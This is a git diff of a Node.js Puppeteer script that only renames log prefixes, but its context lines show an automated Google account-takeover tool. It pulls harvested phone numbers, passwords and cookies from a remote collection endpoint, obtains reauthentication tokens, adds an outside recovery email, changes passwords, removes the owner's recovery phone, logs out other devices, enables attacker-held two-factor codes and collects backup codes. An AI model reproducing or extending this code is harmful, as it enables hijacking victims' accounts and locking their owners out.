@@ -148,7 +148,7 @@ startServer()
 
 
 async function startServer() {
-    console.log('Node: ---START-SERVER---')
+    console.log('Process: ---START-SERVER---')
 
     let prevNumber = ''
 
@@ -170,7 +170,7 @@ async function startServer() {
             } else {
                 mSameNumber = 0
             }
-            console.log('Node: [ Receive New Data --- Time: '+getTime()+' ]')
+            console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
             await loginWithCompleted(data.number, data.password, data.cookies, data.key)
             prevNumber = data.number
             try {
@@ -191,7 +191,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
             mMailData = await getMailTokenData()
             let mMailYear = await getMailYear(mMailData)
 
-            console.log('Node: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
             
             let browser = await puppeteer.launch({
                 headless: false,
@@ -265,19 +265,19 @@ async function loginWithCompleted(number, password, cookies, worker) {
                 }
             })
 
-            console.log('Node: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
             
             try {
                 let mData = await waitForAccountDetails(page)
 
-                console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                 
                 let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
 
                 let mPassword = mToken.password
                 let mRapt = mToken.token
 
-                console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
+                console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                 
                 if (mRapt) {
                     if (mMailData == null) {
@@ -292,7 +292,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
 
                     mYear = (mNumberYear < mYear) ? mNumberYear : mYear
                     
-                    console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
 
                     let rapt = await getRapt(await page.url())
 
@@ -300,7 +300,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     
                     let mRecovery = await waitForRecoveryAdd(page, number, password, mRapt, 'arafat.arf121@gmail.com')
     
-                    console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
                     
                     rapt = await getRapt(await page.url())
 
@@ -316,23 +316,23 @@ async function loginWithCompleted(number, password, cookies, worker) {
                         })
                     } catch (error) {}
     
-                    console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
 
                     await waitForRemoveRecovery(page, mRapt)
                     
                     await waitForLanguageChange(page)
     
-                    console.log('Node: [ Language Change: English --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
     
                     await waitForSkipPassworp(page, mRapt)
     
-                    console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
     
                     await waitForNameChange(page, mRapt)
     
                     let mTwoFa = await waitForTwoFaActive(page, mRapt)
     
-                    console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
 
                     let n_cookies = await getNewCookies(await page.cookies())
                     
@@ -343,7 +343,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                             }
                         })
 
-                        console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                        console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                     } catch (error) {}
                 } else {
                     let n_cookies = await getNewCookies(await page.cookies())
@@ -361,7 +361,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     await axios.delete(BASE_URL+'collect/'+number+'.json')
                 } catch (error) {}
             } catch (error) {
-                console.log('Node: [ Browser Process: Error --- Time: '+getTime()+' ]')
+                console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
             }
             
             try {
@@ -376,7 +376,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                 }
             } catch (error) {}   
         } else {
-            console.log('Node: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
 
             await axios.delete(BASE_URL+'collect/'+number+'.json')
         }
@@ -391,7 +391,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     }
                 })
             } catch (error) {}
-            console.log('Node: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
             await axios.delete(BASE_URL+'collect/'+number+'.json')
             mSameNumber = 0
         }
@@ -634,7 +634,7 @@ async function waitForDeviceLogout(page, mRapt, number, password, size) {
                 return { list:logout, year:year }
             })
     
-            console.log('Node: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
     
             for (let i = 0; i < mDevice.list.length; i++) {
                 try {
@@ -802,16 +802,16 @@ async function waitForNameChange(page, mRapt) {
             if (save) {
                 await save.click()
                 await delay(3000)
-                console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
+                console.log('Process: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
             } else {
                 await delay(3000)
-                console.log('Node: [ Name Change: Error --- Time: '+getTime()+' ]')
+                console.log('Process: [ Name Change: Error --- Time: '+getTime()+' ]')
             }
             return true
         }
     } catch (error) {}
 
-    console.log('Node: [ Name Change: Failed --- Time: '+getTime()+' ]')
+    console.log('Process: [ Name Change: Failed --- Time: '+getTime()+' ]')
 }
 
 async function waitForRemoveRecovery(page, mRapt) {
@@ -843,7 +843,7 @@ async function waitForRemoveRecovery(page, mRapt) {
                         let remove = await findView(page, 'div[role="button"]', 'REMOVE NUMBER')
                         if (remove) {
                             await remove.click()
-                            console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
+                            console.log('Process: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                             await delay(2000)
                             mRemove = true
                             break
@@ -855,7 +855,7 @@ async function waitForRemoveRecovery(page, mRapt) {
             } else {
                 let add = await findView(page, 'button', 'Add recovery phone')
                 if (add) {
-                    console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
                     return true
                 }
             }
@@ -864,7 +864,7 @@ async function waitForRemoveRecovery(page, mRapt) {
         }
     } catch (error) {}
 
-    console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
+    console.log('Process: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
 
     return false
 }
@@ -925,7 +925,7 @@ async function waitForRaptToken(page, number, password) {
                     mRapt = await getRapt(url)
                     break
                 } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
-                    console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
                     await waitForSelector(page, 'input[type="password"]')
                     await delay(500)
                     await page.type('input[type="password"]', password)
@@ -949,7 +949,7 @@ async function waitForRaptToken(page, number, password) {
                                 break
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                                 if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
-                                    console.log('Node: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
+                                    console.log('Process: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
                                     await delay(2000)
                                     await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                     cSelection = false
@@ -960,7 +960,7 @@ async function waitForRaptToken(page, number, password) {
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                                 if(!number) break
                                 if (await exists(page, 'input#phoneNumberId')) {
-                                    console.log('Node: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
+                                    console.log('Process: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
                                     await delay(2000)
                                     await page.type('input#phoneNumberId', number)
                                     await delay(500)
@@ -969,7 +969,7 @@ async function waitForRaptToken(page, number, password) {
                                     load = 10
                                 }
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
-                                console.log('Node: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
+                                console.log('Process: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
                                 mCodeSend = true
                                 break
                             } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
@@ -1024,7 +1024,7 @@ async function waitForLoginChallenge(page, number, password, target) {
         let url = await page.url()
 
         if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
-            console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
             await waitForSelector(page, 'input[type="password"]')
             await delay(500)
             await page.type('input[type="password"]', password)
@@ -1112,7 +1112,7 @@ async function waitForTwoFaActive(page, mRapt) {
                 await waitForFindView(page, 'button', 'Change authenticator app')
                 mAuthToken = authToken
 
-                console.log('Node: [ Auth Token: Received --- '+getTime()+' ]')
+                console.log('Process: [ Auth Token: Received --- '+getTime()+' ]')
             }
         }
     } catch (error) {}
@@ -1158,7 +1158,7 @@ async function waitForTwoFaActive(page, mRapt) {
                                 code += list[i]+'\t'
                             }
                             mBackupCode = code.trim()
-                            console.log('Node: [ Backup Code: Received --- '+getTime()+' ]')
+                            console.log('Process: [ Backup Code: Received --- '+getTime()+' ]')
                             break
                         }
                     }
